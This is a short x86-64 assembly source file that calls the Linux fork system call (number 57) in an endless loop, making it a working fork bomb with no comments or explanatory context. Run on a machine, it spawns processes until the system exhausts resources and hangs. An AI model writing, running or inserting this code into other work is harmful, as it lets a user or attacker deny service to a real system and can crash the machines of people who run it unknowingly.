BITS 64
global _start

section .text

_start:
    push 57
    pop rax
    syscall
    jmp _start
